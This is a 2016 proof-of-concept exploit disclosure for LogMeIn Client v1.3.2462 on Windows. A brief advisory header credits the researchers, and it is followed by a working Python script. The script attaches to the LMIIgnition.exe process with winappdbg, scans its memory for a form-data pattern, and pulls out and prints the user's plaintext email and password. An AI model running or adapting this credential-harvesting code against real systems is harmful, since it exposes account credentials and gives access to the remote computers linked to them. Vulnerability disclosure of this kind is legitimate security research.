#####
# LogMeIn Client v1.3.2462 (64bit) Local Credentials Disclosure
# Tested on Windows Windows Server 2012 R2 64bit, English
# Vendor Homepage @ https://secure.logmein.com/home/en
# Date 06/09/2016
# Bug Discovery by:
#
# Alexander Korznikov (https://www.linkedin.com/in/nopernik)
# http://korznikov.com/
#
# Viktor Minin (https://www.linkedin.com/in/MininViktor)
# https://1-33-7.com/
#
# Yakir Wizman (https://www.linkedin.com/in/yakirwizman)
# http://www.black-rose.ml
#
#####
# LogMeIn Client v1.3.2462 is vulnerable to local credentials disclosure, the supplied username and password are stored in a plaintext format in memory process.
# A potential attacker could reveal the supplied username and password in order to gain access to account and associated computers.
#####
# Proof-Of-Concept Code:

import time
import urllib
from winappdbg import Debug, Process

username	= ''
password	= ''
found		= 0
filename 	= "LMIIgnition.exe"
process_pid = 0
memory_dump	= []

debug = Debug()
try:
	print "[~] Searching for pid by process name '%s'.." % (filename)
	time.sleep(1)
	debug.system.scan_processes()
	for (process, process_name) in debug.system.find_processes_by_filename(filename):
		process_pid = process.get_pid()
	if process_pid is not 0:
		print "[+] Found process with pid #%d" % (process_pid)
		time.sleep(1)
		print "[~] Trying to read memory for pid #%d" % (process_pid)
		
		process = Process(process_pid)
		for address in process.search_bytes('\x26\x5F\x5F\x56\x49\x45\x57\x53\x54\x41\x54\x45\x3D'):
			memory_dump.append(process.read(address,150))
		for i in range(len(memory_dump[0])):
			email_addr 	= memory_dump[i].split('email=')[1]
			tmp_passwd 	= memory_dump[i].split('password=')[1]
			username	= email_addr.split('&hiddenEmail=')[0]
			password	= tmp_passwd.split('&rememberMe=')[0]
			if username != '' and password !='':
				found = 1
				print "[+] Credentials found!\r\n----------------------------------------"
				print "[+] Username: %s" % urllib.unquote_plus(username)
				print "[+] Password: %s" % password
				break
		if found == 0:
			print "[-] Credentials not found! Make sure the client is connected."
	else:
		print "[-] No process found with name '%s'." % (filename)
	
	debug.loop()
finally:
    debug.stop()